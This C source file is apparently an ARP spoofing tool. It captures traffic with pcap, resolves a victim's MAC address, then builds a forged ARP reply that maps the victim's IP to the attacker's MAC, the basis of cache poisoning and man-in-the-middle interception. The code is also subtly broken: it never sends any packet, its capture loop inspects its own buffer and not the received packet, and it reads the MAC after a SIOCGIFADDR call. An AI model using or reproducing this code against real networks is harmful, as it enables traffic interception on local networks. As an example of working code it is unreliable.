#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<linux/if_ether.h>
#include<sys/ioctl.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netpacket/packet.h>
#include<arpa/inet.h>
#include<unistd.h>
#include<net/if.h>
#include<pcap.h>
#include<stdint.h>

#define ETH_ALEN 6
#define ETH_HLEN 14
#define ETHER_TYPE_FOR_ARP 0x0806

#define PROTO_TYPE_FOR_IP 0x0800

#define ARP_HLEN 28
#define ARP_PALEN 4
#define ARP_HALEN ETH_ALEN
#define HW_TYPE_FOR_ETHER 0x0001
#define OP_CODE_FOR_ARP_REQ 1
#define OP_CODE_FOR_ARP_REP 2


struct ethernet{
    unsigned char desMac[6];
    unsigned char souMac[6];
    unsigned short int type;
};
struct arp{
    unsigned short int hdtype;
    unsigned short int prtype;
    unsigned char hdleng;
    unsigned char prleng;
    unsigned short int opcode;
    unsigned char attackHA[6];
    unsigned char attackPA[4];
    unsigned char victimHA[6];
    unsigned char victimPA[4];
};
void convIP(unsigned char* before, unsigned char *after){
    sscanf (before, "%u.%u.%u.%u",&after[0],&after[1],&after[2],&after[3]);
}

int main(int argc, char *argv[]){
    int sockfd, arpfd, retn;
    char buffer[1024];
    struct ifreq ifr;

    struct sockaddr_in *sin;
    struct sockaddr_ll sa;
    unsigned long int ipAddr;

    unsigned char attack[4], victim[4];
    unsigned char broadcast[6] ={0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char attackMac[6] = {0,};
    unsigned char victimMac[6] = {0,};

    if(argc != 4){
        printf("Input value! \n");
        exit(1);
    }

    convIP(argv[2],attack);
    convIP(argv[3],victim);

    sockfd = socket(AF_INET,SOCK_STREAM,0);
    if(sockfd <0){
        perror("socket() ");
        exit(1);
    }

    memcpy(ifr.ifr_name,argv[1],IF_NAMESIZE);

    retn = ioctl(sockfd, SIOCGIFADDR, &ifr, sizeof(ifr));
    if( retn < 0 ){
        perror("ioctl() ");
        close(sockfd);
        exit(1);
    }

    sin=(struct sockaddr_in *)&ifr.ifr_addr;
    ipAddr=ntohl(sin->sin_addr.s_addr);

    printf("Name: %s \nIP Address: %s \n",argv[1], inet_ntoa(sin->sin_addr));
    printf("MAC address: %02x",ifr.ifr_hwaddr.sa_data[0]&0xFF);
    for(int i=1;i<6;i++){
        printf(":%02x",ifr.ifr_hwaddr.sa_data[i]&0xFF);
    }
    printf("\n");
    close(sockfd);

    char*dev = argv[1];
    char*error[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev,BUFSIZ,1,1000,error);
    if(handle == NULL){
        printf("pcap() error!\n");
        exit(1);
    }

    memcpy(attackMac,ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    struct ethernet *eth = (struct ethernet *)malloc(ETH_HLEN);
    memcpy(eth->desMac,broadcast,ETH_ALEN);
    memcpy(eth->souMac,attackMac,ETH_ALEN);
    eth->type = htons(ETHER_TYPE_FOR_ARP);

    struct arp *ar = (struct arp *)malloc(ARP_HLEN);
    ar->hdtype = htons(HW_TYPE_FOR_ETHER);
    ar->prtype = htons(PROTO_TYPE_FOR_IP);
    ar->hdleng = ARP_HALEN;
    ar->prleng = ARP_PALEN;
    ar->opcode = htons(OP_CODE_FOR_ARP_REQ);

    memcpy(ar->attackHA,attackMac,ARP_HALEN);
    memcpy(ar->victimHA,broadcast,ARP_PALEN);
    memcpy(ar->victimPA,victim,ARP_PALEN);

    unsigned long packetSize = ETH_HLEN + ARP_HLEN;
    unsigned char *packet = (char*)malloc(sizeof(unsigned char)* packetSize);
    memcpy(packet,eth,ETH_HLEN);
    memcpy(packet+ETH_HLEN,ar,ARP_HLEN);

    while(1){
        struct pcap_pkthdr* header;
        const unsigned char * pkt;
        int result = pcap_next_ex(handle, &header, &pkt);
        if(result ==0 )continue;
        if(result == -1 || result == -2) break;

        eth=(struct ethernet*)pkt;
        pkt+= ETH_HLEN;

        if(ntohs(ar->opcode)!=OP_CODE_FOR_ARP_REP)continue;
        if(memcmp(ar->attackPA,victim,ARP_PALEN)!=0) continue;
        else{
            memcpy(victimMac,ar->attackHA,ARP_HALEN);
            printf("ARP Reply > MAC ADDRESS : %02x:%02x:%02x:%02x:%02x:%02x\n", victimMac[0],victimMac[1],victimMac[2],victimMac[3],victimMac[4],victimMac[5]);
            break;
        }
    }
    memcpy(eth->desMac,victimMac,ETH_ALEN);
    memcpy(eth->souMac,attackMac,ETH_ALEN);

    ar->opcode = htons(OP_CODE_FOR_ARP_REP);
    memcpy(ar->attackHA,attackMac,ARP_HALEN);
    memcpy(ar->attackPA,victim,ARP_PALEN);
    memcpy(ar->victimHA,victimMac,ARP_HALEN);
    memcpy(ar->victimPA,attack,ARP_PALEN);

    memcpy(packet,eth,ETH_HLEN);
    memcpy(packet+ETH_HLEN,ar,ARP_HLEN);


    pcap_close(handle);
    return 0;

}
